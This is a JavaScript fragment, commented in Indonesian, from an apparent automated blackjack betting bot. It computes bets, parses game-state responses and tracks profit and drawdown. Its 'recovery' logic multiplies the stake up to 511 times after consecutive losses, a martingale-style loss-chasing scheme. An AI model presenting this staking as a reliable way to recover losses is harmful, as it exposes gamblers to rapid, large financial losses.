    // DAPATKAN MULTIPLIER UNTUK RECOVERY
    function getRecoveryMultiplier() {
        const steps = JSON.parse(document.getElementById("p-recovery-steps").value || "[1,2,3,4,8,16,32,64,128,256,511]");
        if (bot.recoveryConsecutiveLosses < steps.length) {
            return steps[bot.recoveryConsecutiveLosses];
        }
        return steps[steps.length - 1];
    }

    // HITUNG BET RECOVERY (dibulatkan ke 0.01)
    function calculateRecoveryBet() {
        const baseBet = parseFloat(document.getElementById("p-blackjack-basebet").value) || 0.001;
        const multiplier = getRecoveryMultiplier();
        let rawBet = baseBet * multiplier;
        // Round to 0.01, minimal 0.01
        let bet = Math.floor(rawBet * 100) / 100;
        if (bet < 0.01) bet = 0.01;
        return bet;
    }

    // PARSE BLACKJACK RESPONSE
    function parseBlackjackResponse(data) {
        let gameData = data.blackjackBet || data.blackjackNext || data;
        
        if (gameData.state) {
            const state = gameData.state;
            const playerHands = [];
            const dealerHand = [];
            
            if (state.player && state.player.length > 0) {
                for (const hand of state.player) {
                    if (hand.cards) {
                        playerHands.push({
                            cards: hand.cards,
                            actions: hand.actions || []
                        });
                    }
                }
            }
            
            if (state.dealer && state.dealer.length > 0 && state.dealer[0].cards) {
                dealerHand.push(...state.dealer[0].cards);
            }
            
            // Update state, pertahankan currentHandIndex jika masih valid
            let newIndex = bot.blackjackState.currentHandIndex;
            if (playerHands.length > 0 && newIndex >= playerHands.length) {
                newIndex = 0; // reset jika tidak valid
            }
            
            bot.blackjackState = {
                identifier: gameData.identifier || bot.blackjackState.identifier,
                gameId: gameData.id,
                playerHands: playerHands,
                dealerHand: dealerHand,
                active: gameData.active || false,
                currentHandIndex: newIndex,
                insuranceOffered: playerHands[0]?.actions?.includes("insurance") || false
            };
        }
        
        return gameData;
    }

    // PROCESS BLACKJACK BET RESULT
    function processBlackjackResult(betResult, betAmount) {
        const gameData = betResult.blackjackBet || betResult.blackjackNext || betResult;
        const payout = gameData.payout || 0;
        const pnl = payout - betAmount;
        
        // Parse state for display
        parseBlackjackResponse(betResult);
        
        const isWin = payout > betAmount * 1.5 ? "blackjack" : (payout > betAmount ? "win" : (payout === betAmount ? "push" : "loss"));
        
        bot.stats.bets++;
        bot.stats.wagered += betAmount;
        
        if (isWin === "win" || isWin === "blackjack") {
            bot.stats.wins++;
            bot.recoveryConsecutiveLosses = 0;
        } else if (isWin === "push") {
            // Push - tidak menang atau kalah
        } else {
            bot.stats.loss++;
            bot.recoveryConsecutiveLosses++;
        }
        
        bot.stats.profit += pnl;
        
        if (bot.stats.profit < bot.stats.maxDD) {
            bot.stats.maxDD = bot.stats.profit;
        }
        
        // Update last result for display
        bot.lastBetResult = {
            result: isWin,
            amount: betAmount,
            payout: payout,
            profit: pnl
        };
        
        return pnl;
    }

